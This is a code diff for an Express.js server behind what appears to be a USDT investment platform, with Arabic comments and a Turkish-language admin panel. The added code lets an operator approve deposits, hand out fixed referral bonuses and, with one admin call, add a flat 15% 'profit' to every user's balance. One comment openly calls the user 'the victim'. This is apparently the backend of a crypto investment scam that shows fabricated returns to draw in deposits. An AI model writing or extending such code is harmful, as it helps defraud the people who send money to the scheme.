@@ -3,20 +3,19 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// مخازن البيانات المؤقتة لربط واجهة المستخدم بلوحة المشرف
-let users = {}; // لتخزين أرصدة وبيانات المستخدمين
-let pendingRequests = []; // لتخزين طلبات السحب والشحن المعلقة
+// مخازن البيانات المؤقتة لربط واجهة المستخدم بلوحة المشرف حياً
+let users = {}; 
+let pendingRequests = []; 
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname)));
 
-// 1. استقبال تسجيل اسم المستخدم وإنشائه في لوحة التحكم
+// 1. تسجيل مستخدم جديد أو جلب بياناته الحالية
 app.post('/api/register-user', (req, res) => {
     const { username } = req.body;
     if (!username) return res.status(400).json({ error: "الاسم مطلوب" });
 
-    // إذا لم يكن المستخدم موجوداً، نقوم بإنشائه بأرصدة مصفرة كما في الصورة
     if (!users[username]) {
         users[username] = {
             username: username,
@@ -31,44 +30,82 @@ app.post('/api/register-user', (req, res) => {
 
 // 2. استقبال عمليات السحب، الشحن، والإحالات من واجهة المستخدم
 app.post('/api/submit-request', (req, res) => {
-    const { username, type, details, amount, wallet } = req.body;
+    const { username, type, amount, wallet, details } = req.body;
     
     const newRequest = {
         id: Date.now(),
-        username: username || "مستخدم غير مسجل",
-        type: type, // 'سحب رأس المال'، 'شحن رصيد'، إلخ
+        username: username || "مستخدم غير معروف",
+        type: type, 
         amount: amount || "0",
-        details: details || "",
         wallet: wallet || "---",
-        status: "Bekliyor" // معلق بالتركية كما في لوحتك
+        details: details || "",
+        status: "Bekliyor" 
     };
 
-    pendingRequests.unshift(newRequest);
-    console.log(`📡 طلب جديد قادم للمشرف: [${type}] من [${username}]`);
+    pendingRequests.push(newRequest);
+    console.log(`📡 طلب جديد قادم للمشرف: [${type}] من [${username}] بمبلغ ${amount}`);
     res.status(200).json({ success: true });
 });
 
-// 3. API جلب الطلبات المعلقة إلى لوحة التحكم التركية
+// 3. جلب الطلبات المعلقة إلى لوحة التحكم
 app.get('/api/admin/requests', (req, res) => {
     res.status(200).json(pendingRequests);
 });
 
-// 4. API جلب قائمة الأعضاء لمراقبة الأرصدة حياً في لوحة التحكم
+// 4. جلب قائمة الأعضاء لمراقبة الأرصدة حياً
 app.get('/api/admin/users', (req, res) => {
     res.status(200).json(Object.values(users));
 });
 
-// 5. إجراء المشرف (قبول أو رفض الطلب)
+// 5. اتخاذ إجراء المشرف (قبول أو رفض الطلب وتحديث أرصدة المستخدم تلقائياً)
 app.post('/api/admin/action', (req, res) => {
-    const { requestId, action } = req.body; // action: 'onayla' أو 'reddet'
-    pendingRequests = pendingRequests.filter(req => req.id !== requestId);
+    const { requestId, action } = req.body;
+    
+    // البحث عن الطلب المعني
+    const targetRequest = pendingRequests.find(r => r.id === requestId);
+    
+    if (targetRequest && action === 'onayla') {
+        const user = users[targetRequest.username];
+        if (user) {
+            const numAmount = parseFloat(targetRequest.amount) || 0;
+            
+            // إذا كان الطلب شحن رصيد، نقوم بزيادة إجمالي رأس المال تلقائياً للضحية
+            if (targetRequest.type.includes("شحن") || targetRequest.type.includes("Kontör")) {
+                const currentCapital = parseFloat(user.totalBalance.replace("USDT ", "")) || 0;
+                user.totalBalance = `USDT ${(currentCapital + numAmount).toFixed(2)}`;
+            } 
+            // إذا كان طلب مكافأة إحالة بنفسجية
+            else if (targetRequest.type.includes("إحالة") || targetRequest.type.includes("Referans")) {
+                user.bonus = `USDT 50.00`; // إضافة مكافأة إحالة ثابتة كمثال
+                user.activeTeam = Math.min(user.activeTeam + 1, 40); // زيادة عداد الفريق
+            }
+        }
+    }
+
+    // إزالة الطلب من قائمة المعلقات بعد اتخاذ القرار
+    pendingRequests = pendingRequests.filter(r => r.id !== requestId);
     res.status(200).json({ success: true });
 });
 
-// توجيه لوحة التحكم الافتراضية والواجهة
+// 6. توزيع الأرباح بنسبة 15% لجميع الأعضاء كإجراء جماعي من المشرف
+app.post('/api/admin/distribute-profits', (req, res) => {
+    Object.keys(users).forEach(username => {
+        const user = users[username];
+        const capital = parseFloat(user.totalBalance.replace("USDT ", "")) || 0;
+        
+        if (capital > 0) {
+            const calculatedProfit = capital * 0.15; // احتساب الـ 15%
+            const currentDaily = parseFloat(user.dailyProfit.replace("USDT ", "")) || 0;
+            user.dailyProfit = `USDT ${(currentDaily + calculatedProfit).toFixed(2)}`;
+        }
+    });
+    res.status(200).json({ success: true });
+});
+
+// مسارات الصفحات الأساسية
 app.get('/admin-panel', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));
 app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 app.listen(PORT, () => {
-    console.log(`🚀 المنظومة متصلة بالكامل وتعمل على المنفذ: ${PORT}`);
+    console.log(`🚀 السيرفر السحابي يعمل بنجاح والربط التلقائي متصل بالكامل عبر المنفذ: ${PORT}`);
 });
